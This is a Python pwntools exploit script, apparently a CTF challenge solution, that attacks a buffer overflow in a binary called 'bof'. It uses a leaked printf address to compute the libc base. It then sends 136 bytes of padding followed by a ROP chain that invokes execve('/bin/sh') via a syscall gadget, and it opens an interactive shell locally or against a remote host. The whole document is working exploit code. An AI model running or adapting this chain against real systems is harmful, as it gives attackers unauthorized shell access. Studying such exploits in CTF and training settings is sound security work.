#!/usr/bin/python 
#coding: utf-8
__author__ = "TaQini"
from pwn import *
import sys
# context.log_level = 'debug'

if len(sys.argv)>2:
    addr = sys.argv[1]
    port = int(sys.argv[2])   
    p = remote(addr,port)
else:
    p = process('./bof')

libc = ELF("../libc.so.6")

printf_libc = libc.symbols['printf']
log.info("printf@libc: " + hex(printf_libc))

system_libc = libc.symbols['execve']
log.info("execve@libc: " + hex(system_libc))

binsh_libc = libc.search('/bin/sh').next()
log.info("binsh@libc: " + hex(binsh_libc))

buflen = 136
padding = 0xdeadbeef

# some func leak libc
printf = u64(p.recv(8))
log.info("printf= " + hex(printf))
p.recvuntil("input\n")

offset = printf - printf_libc

# gadget in elf
pppr = 0x000000000040068e        # pop r13 ; pop r14 ; pop r15 ; ret
log.info("pppr= " + hex(pppr))

# gadgets in libc
mmmc = 0x00000000001396be + offset
# mov rdx, r15; mov rsi, r14; mov rdi, r13; call rax;
log.info("mmmc= " + hex(mmmc))

prax = 0x00000000000439c8 + offset
# pop rax; ret;
log.info("poprax= " + hex(prax))

binsh = binsh_libc + offset
log.info("binsh= " + hex(binsh))

syscall = 0x00000000001306d7 + offset # syscall
log.info("syscall= " + hex(syscall))

ppr = 0x00000000001306d9 + offset # pop rdx; pop rsi; ret; 

payload = ""
payload += "A" * buflen
payload += p64(pppr)
r13 = binsh            # mov    rdx,r13
r14 = 0                # mov    rsi,r14
r15 = 0                # mov    edi,r15
ret = prax
payload += p64(r13) + p64(r14) + p64(r15) + p64(ret)
call = ppr
ret = mmmc
payload += p64(call) + p64(ret)
ret = prax
payload += p64(0) + p64(ret)
rax = 59
ret = ppr
payload += p64(rax) + p64(ret)
rdx = 0
rsi = 0
ret = syscall
payload += p64(rdx) + p64(rsi) + p64(ret)

# gdb.attach(p)
p.sendline(payload)

p.interactive()
